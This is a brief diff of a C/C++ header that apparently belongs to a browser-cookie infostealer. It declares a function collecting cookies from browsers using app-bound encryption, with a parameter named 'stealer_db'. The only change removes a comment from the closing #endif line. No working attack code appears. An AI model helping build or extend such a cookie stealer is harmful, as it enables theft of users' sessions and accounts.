@@ -7,4 +7,4 @@
 
 BOOL app_bound_browsers_cookie_collector(std::string username, std::string stealer_db, BOOL service, std::string service_parameter);
 
-#endif /* APPBOUNDKEYPARSER_H */
+#endif
